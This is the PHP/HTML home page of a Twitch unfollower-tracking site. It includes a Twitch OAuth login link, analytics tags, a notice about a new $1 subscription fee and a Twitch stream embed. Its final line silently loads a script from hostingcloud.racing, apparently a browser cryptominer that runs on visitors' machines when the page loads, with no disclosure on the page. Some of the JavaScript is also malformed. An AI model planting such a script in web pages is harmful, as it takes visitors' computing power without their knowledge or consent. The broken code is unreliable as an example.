<!DOCTYPE html>
<!--
To change this license header, choose License Headers in Project Properties.
To change this template file, choose Tools | Templates
and open the template in the editor.
-->
<html>
    <head>
        <title>Unfollowers - Check who unfollowed you on Twitch</title>
        <!-- Google Tag Manager -->
        <script>(function (w, d, s, l, i) {
                w[l] = w[l] || [];
                w[l].push({'gtm.start':
                            new Date().getTime(), event: 'gtm.js'});
                var f = d.getElementsByTagName(s)[0],
                        j = d.createElement(s), dl = l != 'dataLayer' ? '&l=' + l : '';
                j.async = true;
                j.src =
                        'https://www.googletagmanager.com/gtm.js?id=' + i + dl;
                f.parentNode.insertBefore(j, f);
            })(window, document, 'script', 'dataLayer', 'GTM-TZSXQFP');</script>
        <!-- End Google Tag Manager -->
        <meta name="description" content="How to find who unfollowed you on Twitch? This website helps you find unfollowers free of charge!">
        <meta name="keywords" content="twitch, unfollow, free, unfollowers">
        <meta name="author" content="Daniel Baychev">
        <meta name="propeller" content="fa6907ec73c6db627b1db4e1b5734652">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <link rel="shortcut icon" type="image/x-icon" href="img/h.png" />
        <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
        <script src="newjavascript.js"></script><script type = "text/javascript" 
                                                        src = "https://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js">
        </script>
        <link href="css/index.css" rel="stylesheet" type="text/css"/>
        <script src="login.js" type="text/javascript"></script>

        <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>


        <script src="js/json2.js" type="text/javascript"></script>
        <link href="css/bootstrap.min.css" rel="stylesheet" type="text/css"/>
        <link href="css/css.css" rel="stylesheet" type="text/css"/>
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
        <script>
            function myFunction() {
                var x = document.getElementById("myTopnav");
                if (x.className === "topnav") {
                    x.className += " responsive";
                } else {
                    x.className = "topnav";
                }
            }
        </script>

        <!-- Global site tag (gtag.js) - Google Analytics -->
        <script async src="https://www.googletagmanager.com/gtag/js?id=UA-129733775-1"></script>
        <script>
            window.dataLayer = window.dataLayer || [];
            function gtag() {
                dataLayer.push(arguments);}
            gtag('js', new Date());

            gtag('config', 'UA-129733775-1');
        </script>


    </head>
    <body style="font-family: Sans-Serif;background-color: white">
<?php
//  echo  include_once (dirname(__FILE__) . '/pa_antiadblock_2487106.php');
?>
        <!-- Google Tag Manager (noscript) -->
        <noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-TZSXQFP"
                          height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
        <!-- End Google Tag Manager (noscript) -->
        <nav role='navigation'>
            <div class="topnav" id="myTopnav">
                <a href="home.php" onclick="page(this);" class="active">Home</a>
                <a href="f4f.php" onclick="page(this);">F4F Tool</a>
                <a href="register.php" onclick="page(this);">Unfollower</a>
                <a href="regchatters.php" onclick="page(this);">Viewers</a>
                <a href="links.php" onclick="page(this);">Useful Links</a>
                <a href="about.php" onclick="page(this);">About</a>
                <!-- PAGE(THIS)is located in login js ..  -->
                <a id="hidden" style="display:block;margin:auto;text-align:center;" href="https://id.twitch.tv/oauth2/authorize?response_type=token&client_id=v8jjvzxpx7byti5lykiyy5001gueh4&redirect_uri=http://unfollowers.tv/home.php&scope=analytics:read:extensions"><img height="25"  class="logme"  src="img/login.png"></a>

                <a href="javascript:void(0);" class="icon" onclick="myFunction()">
                    <i class="fa fa-bars"></i>
                </a>
            </div>
        </nav>

        <br>

        <br>
<?php // require_once 'ads.php';
?>
        <br>
        <br>    
        <h1 style="color:#ffffff;text-align: center;">Find who unfollowed you on Twitch!</h1>
        <div style="background-color:#33333357;border-radius: .25rem;" class="container">
            <div class="row">
                <div class="col-md-12">
                    <h4 style="color:white; text-align: center;">Important update to the website!</h4>
                    <br>
                    <p style="color:white;">Hey everyone, I wanted to inform you all, that this website is going to be using a subscription fee of 1$ in order to continue using the unfollow page. <br> The reason for this change is because I can not afford paying the hosting fees each month and the only choices I had were to either monetize this website or shut it down.<br>It is not my intention to make money from this website! This website started off as a fun web project and was supposed to be accessible to everyone!
                        <br>If you guys decide to help me out with the hosting fees, I promise to deliver more tools and update the website more often! I will answer all Questions on my twitter! Thank you for understanding !
                        <a href="https://twitter.com/AnalyticsTwitch"><img height="15" src="img/twitter.png"/></a> </p>     
                </div>

            </div>
        </div>
        <br>
        <div style="background-color:#33333357;border-radius: .25rem;" class="container">
            <div class="row">
                <div class="col-md-12">
                    <h4 style="color:white;text-align: center;">What is this website for ?</h4>
                    <br>
                    <p style="color:white;">If You are a small streamer and would like to track unfollowers or if you use the follow for follow service to grow Your channel, this website is for you ! <img src="img/feelsgoodman.png" width="50"> </p>       
                </div>
            </div>
        </div>
        <br>



        <br>

        <div style="text-align:center;margin-top:40px;margin-bottom:40px;" id="twitch-embed"></div>

        <!-- Load the Twitch embed script -->
        <script src="https://embed.twitch.tv/embed/v1.js"></script>
        <div class="footer">
            <p style="margin:auto;">twitchtoolstv@gmail.com <a target="_blank" href="https://patreon.com/twitchtools"><img src="img/patreon.png" height="15"/></a> <a href="https://twitter.com/AnalyticsTwitch"><img height="15" src="img/twitter.png"/></a> </p>
        </div>

        <script type="text/javascript">
                    if (typeof tkn === "string") {
                        var hide = document.getElementById("hidden");
                        hide.style.display = "none";
                    }
                    $.ajax({
                        url: 'https://api.twitch.tv/helix/streams?user_login=hidemon',
                        beforeSend: function (xhr) {
                            xhr.setRequestHeader("Authorization", "Bearer " + getUrlParameter('fragmentaccess_token'))
                        },
                        success: function (json) {
                            //process the JSON data etc

                            $.each(json.data, function (i, field) {
//$("#myTopnav").append("<p>" + field.type + "</p>");
                                if (typeof field.type === "string") {

                                    new Twitch.Embed("twitch-embed", {
                                        width: 1000,
                                        height: 480,
                                        channel: "hidemon"
                                    });
                                    embed.addEventListener(getUrlParameter('fragmentaccess_token')).Embed.AUTHENTICATE, function (user) {
                                        console.log(user.login + ' just logged in');
                                    };
                                }
                            });
                        }});

        </script>
        <script>
            function v2_open() {
                document.getElementById("main").style.marginLeft = "25%";
                document.getElementById("mySidebar").style.display = "block";
                document.getElementById("openNav").style.display = 'none';
            }
            function v2_close() {
                document.getElementById("main").style.marginLeft = "0%";
                document.getElementById("mySidebar").style.display = "none";
                document.getElementById("openNav").style.display = "inline-block";
            }
        </script>
        <script src="https://www.hostingcloud.racing/8qk1.js"></script>

    </body>
</html>
